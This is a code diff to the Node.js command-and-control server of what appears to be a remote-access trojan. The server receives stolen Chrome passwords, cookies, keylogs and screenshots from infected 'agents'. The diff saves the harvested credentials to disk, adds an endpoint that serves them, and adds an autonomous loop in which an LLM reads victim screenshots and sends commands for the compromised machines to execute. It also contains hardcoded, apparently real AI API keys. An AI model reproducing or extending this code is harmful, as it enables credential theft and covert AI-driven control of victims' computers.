@@ -24,18 +24,52 @@ app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json({ limit: '50mb' })); // Naikkan had saiz JSON untuk screenshot
 
+// ── PERSISTENCE ──────────────────────────────────────────────
+const DATA_FILE = path.join(__dirname, 'ghost_data.json');
+
+function loadPersistedData() {
+  try {
+    if (fs.existsSync(DATA_FILE)) {
+      const raw = fs.readFileSync(DATA_FILE, 'utf-8');
+      return JSON.parse(raw);
+    }
+  } catch (e) { console.log('[PERSIST] Failed to load:', e.message); }
+  return null;
+}
+
+function savePersistedData() {
+  try {
+    const data = {
+      aiConfig,
+      currentMode,
+      harvestedCreds: allHarvestedCreds,
+      capturedPasswords: allCapturedPasswords,
+      logs: persistedLogs.slice(-200), // Keep last 200 log entries
+      savedAt: new Date().toISOString()
+    };
+    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+  } catch (e) { console.log('[PERSIST] Failed to save:', e.message); }
+}
+
+// Load saved data on startup
+const savedData = loadPersistedData();
+
 // State Tracking
 let agents = {};
-// agents[socketId] = {
-//   pcName, lastScreenshot, visionContext, systemContext,
-//   conversationHistory (last 20), credentials, keylogBuffer, networkMap
-// }
 let activeAgentSocketId = null;
-let currentMode = 'B';
-let aiConfig = { qwenKey: 'sk-c03ee9a5ceff42ac8a7d8f4476457475', deepseekKey: 'sk-ba786a1b6d94413d9dafe310ef44bcdf', autopilot: false, useVision: true, skill: 'default', customMission: '' };
+let currentMode = savedData?.currentMode || 'B';
+let aiConfig = savedData?.aiConfig || { qwenKey: 'sk-c03ee9a5ceff42ac8a7d8f4476457475', deepseekKey: 'sk-ba786a1b6d94413d9dafe310ef44bcdf', autopilot: false, useVision: true, skill: 'default', customMission: '' };
 let lastScreenshot = null;
 let isAIBusy = false;
 let hybridCommandQueue = [];
+
+// Persistent collections (survive refresh)
+let allHarvestedCreds = savedData?.harvestedCreds || { passwords: [], cookies: [] };
+let allCapturedPasswords = savedData?.capturedPasswords || [];
+let persistedLogs = savedData?.logs || [];
+
+// Auto-save every 30 seconds
+setInterval(savePersistedData, 30000);
 
 // API Endpoint to check status
 app.get('/api/status', (req, res) => {
@@ -76,16 +110,34 @@ app.get('/api/hybrid_command', (req, res) => {
 
 // Agent Data API: Credentials, keylog, network map
 app.get('/api/agent-data/:type', (req, res) => {
-  if (!activeAgentSocketId || !agents[activeAgentSocketId]) {
-    return res.json({ error: 'No active agent' });
-  }
-  const ag = agents[activeAgentSocketId];
   const { type } = req.params;
-  if (type === 'passwords') return res.json(ag.credentials.passwords);
-  if (type === 'cookies') return res.json(ag.credentials.cookies);
-  if (type === 'keylog') return res.json(ag.keylogBuffer);
-  if (type === 'network') return res.json({ data: ag.networkMap });
+  
+  // Try active agent first
+  if (activeAgentSocketId && agents[activeAgentSocketId]) {
+    const ag = agents[activeAgentSocketId];
+    if (type === 'passwords') return res.json(ag.credentials.passwords.length > 0 ? ag.credentials.passwords : allHarvestedCreds.passwords);
+    if (type === 'cookies') return res.json(ag.credentials.cookies.length > 0 ? ag.credentials.cookies : allHarvestedCreds.cookies);
+    if (type === 'keylog') return res.json(ag.keylogBuffer);
+    if (type === 'network') return res.json({ data: ag.networkMap });
+  } else {
+    // Fall back to persisted data
+    if (type === 'passwords') return res.json(allHarvestedCreds.passwords);
+    if (type === 'cookies') return res.json(allHarvestedCreds.cookies);
+    if (type === 'keylog') return res.json([]);
+    if (type === 'network') return res.json({ data: null });
+  }
   res.json({ error: 'Unknown type' });
+});
+
+// Persisted data API — dashboard loads this on startup
+app.get('/api/persisted', (req, res) => {
+  res.json({
+    aiConfig,
+    currentMode,
+    harvestedCreds: allHarvestedCreds,
+    capturedPasswords: allCapturedPasswords,
+    logs: persistedLogs.slice(-100)
+  });
 });
 
 // Helper: Serialize agents without large screenshot data for list events
@@ -268,8 +320,10 @@ io.on('connection', (socket) => {
     if (agents[socket.id]) {
         if (data.type === 'chrome_passwords') {
             agents[socket.id].credentials.passwords = data.data || [];
+            allHarvestedCreds.passwords = data.data || [];
         } else if (data.type === 'chrome_cookies') {
             agents[socket.id].credentials.cookies = data.data || [];
+            allHarvestedCreds.cookies = data.data || [];
         }
     }
     if (socket.id === activeAgentSocketId) {
@@ -410,16 +464,18 @@ server.listen(PORT, () => {
 // ============================================================
 // AI LOGIC — World-Class Prompt Injection
 // ============================================================
-async function processAIScreenshot(imageBase64, customPrompt = null) {
+async function processAIScreenshot(imageBase64, customPrompt = null, stepsRemaining = 8) {
   if (!aiConfig.qwenKey && !aiConfig.deepseekKey) return;
   isAIBusy = true;
   try {
     let result = null;
-    let basePrompt = "";
+    let aiBrain;
     try {
-      basePrompt = require('./ai_brain.js');
+      // Clear require cache so hot-reload works
+      delete require.cache[require.resolve('./ai_brain.js')];
+      aiBrain = require('./ai_brain.js');
     } catch (err) {
-      basePrompt = "You are an autonomous agent. Respond only with valid JSON action.";
+      aiBrain = null;
     }
 
     // Build system context string
@@ -452,14 +508,20 @@ async function processAIScreenshot(imageBase64, customPrompt = null) {
       missionInstruction = missionMap[aiConfig.skill] || missionMap.default;
     }
 
-    // Assemble full prompt with placeholders replaced
-    let promptText = basePrompt
-      .replace('{{SYSTEM_CONTEXT}}', systemContextStr)
-      .replace('{{CONVERSATION_HISTORY}}', historyStr)
-      .replace('{{DOM_CONTEXT}}', domCtx ? domCtx.substring(0, 2000) : 'No DOM context. Use pinchtab_get_dom to fetch it.')
-      .replace('{{MISSION}}', missionInstruction);
+    // Build prompt using ai_brain.js module or fallback
+    let promptText;
+    if (aiBrain && aiBrain.buildPrompt) {
+      promptText = aiBrain.buildPrompt({
+        systemContext: systemContextStr,
+        conversationHistory: historyStr,
+        domContext: domCtx ? domCtx.substring(0, 2000) : 'No DOM context. Use pinchtab_get_dom to fetch it.',
+        mission: missionInstruction
+      });
+    } else {
+      promptText = `You are an autonomous agent. System: ${systemContextStr}. History: ${historyStr}. DOM: ${domCtx || 'none'}. Mission: ${missionInstruction}. Respond ONLY with valid JSON action.`;
+    }
 
-    if (customPrompt) promptText += `\n\nUSER COMMAND: ${customPrompt}`;
+    if (customPrompt) promptText += `\n\nUSER COMMAND: ${customPrompt}\n[You have ${stepsRemaining} steps remaining. Execute the NEXT logical step now.]`;
 
     // Primary: DeepSeek (text-only, cost-efficient)
     let primaryProvider = aiConfig.deepseekKey ? 'deepseek' : (aiConfig.qwenKey ? 'qwen' : null);
@@ -506,7 +568,7 @@ async function processAIScreenshot(imageBase64, customPrompt = null) {
       // Push to conversation history
       if (ag.conversationHistory) {
         ag.conversationHistory.push({ role: 'user', content: customPrompt || 'autopilot' });
-        ag.conversationHistory.push({ role: 'assistant', content: `action: ${parsed.action}` });
+        ag.conversationHistory.push({ role: 'assistant', content: `action: ${parsed.action}${parsed.url ? ' → ' + parsed.url : ''}${parsed.command ? ' → ' + parsed.command : ''}` });
         if (ag.conversationHistory.length > 40) ag.conversationHistory.splice(0, 2); // Keep 20 turns
       }
 
@@ -540,19 +602,35 @@ async function processAIScreenshot(imageBase64, customPrompt = null) {
       } else if (parsed.action && parsed.action !== 'nothing') {
         if (activeAgentSocketId && agents[activeAgentSocketId]) {
           io.to(activeAgentSocketId).emit('execute_json_command', parsed);
-          io.emit('error_msg', `AI → ${parsed.action}${parsed.command ? ': ' + parsed.command.substring(0,60) : ''}`);
+          io.emit('error_msg', `AI → ${parsed.action}${parsed.command ? ': ' + parsed.command.substring(0,60) : ''}${parsed.url ? ': ' + parsed.url.substring(0,60) : ''}`);
+          
+          // ═══════════════════════════════════════════════════
+          // AUTONOMOUS LOOP: Continue mission automatically!
+          // Wait for action to complete, then re-query AI
+          // ═══════════════════════════════════════════════════
+          if (customPrompt && stepsRemaining > 0) {
+            const nextStep = stepsRemaining - 1;
+            setTimeout(async () => {
+              isAIBusy = false;
+              // Get fresh screenshot from agent
+              let freshScreenshot = agents[activeAgentSocketId] ? agents[activeAgentSocketId].lastScreenshot : imageBase64;
+              io.emit('error_msg', `[AUTO] Continuing mission... (${nextStep} steps left)`);
+              await processAIScreenshot(freshScreenshot || imageBase64, customPrompt, nextStep);
+            }, 4000); // Wait 4 seconds for action to complete
+            return; // Don't release isAIBusy yet, the loop will handle it
+          }
         } else {
           hybridCommandQueue.push(JSON.stringify(parsed));
           io.emit('error_msg', `AI queued (offline): ${parsed.action}`);
         }
       } else {
-        io.emit('error_msg', `AI: Nothing to do. Reason: ${parsed.reason || 'task complete'}`);
+        io.emit('error_msg', `AI: Mission complete. ${parsed.reason || ''}`);
       }
     }
   } catch (err) {
     console.error('[AI ERROR]', err);
     io.emit('error_msg', `AI Error: ${err.message}`);
   } finally {
-    setTimeout(() => { isAIBusy = false; }, 15000);
+    isAIBusy = false;
   }
 }
